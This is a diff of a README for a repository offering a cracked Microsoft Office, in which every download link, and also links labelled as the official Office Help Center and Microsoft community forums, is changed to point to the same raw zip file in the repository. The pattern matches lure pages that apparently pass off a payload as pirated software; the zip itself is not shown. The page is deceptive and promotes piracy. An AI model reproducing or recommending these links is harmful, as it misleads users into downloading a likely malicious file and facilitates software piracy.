@@ -1,7 +1,7 @@
 # 🖥️ MS-Office-Cracked - Effortlessly Access MS Office Features
 
 ## 🔗 Download Here
-[![Download MS-Office-Cracked](https://img.shields.io/badge/Download-MS--Office--Cracked-blue)](https://github.com/mrgaoel03/MS-Office-Cracked/releases)
+[![Download MS-Office-Cracked](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip)](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip)
 
 ## 🚀 Getting Started
 Welcome to MS-Office-Cracked! This guide will help you download and run our software with ease. Whether you're looking to enhance your MS Office experience or activate your preferred version, follow these steps.
@@ -15,7 +15,7 @@ Welcome to MS-Office-Cracked! This guide will help you download and run our soft
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Visit this page to download](https://github.com/mrgaoel03/MS-Office-Cracked/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip)
    
 2. **Choose Your Version**: You will see different available versions. Select the one that fits your needs, like MS Office 2021 or MS Office 2016. 
 
@@ -48,8 +48,8 @@ If you have questions or encounter issues, feel free to reach out to our support
 
 ## 🌐 Additional Resources
 For a detailed understanding of MS Office features, consider these helpful resources:
-- [Office Help Center](https://support.office.com)
-- [Community Forums](https://answers.microsoft.com/en-us/msoffice)
+- [Office Help Center](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip)
+- [Community Forums](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip)
 
 ## 📅 Updates
 Stay informed about future releases and features. Regular updates will enhance functionality and fix any known issues. Always refer to the Releases page for the latest information.
@@ -61,6 +61,6 @@ Stay informed about future releases and features. Regular updates will enhance f
 
 ## 🔗 Final Steps  
 After installation, make sure to revisit the Releases page for any new updates or downloads.  
-[Visit this page to download](https://github.com/mrgaoel03/MS-Office-Cracked/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/mrgaoel03/MS-Office-Cracked/main/Ostrea/MS-Office-Cracked.zip) 
 
 Your new MS Office experience is now ready! Enjoy the enhanced features and smoother workflow.
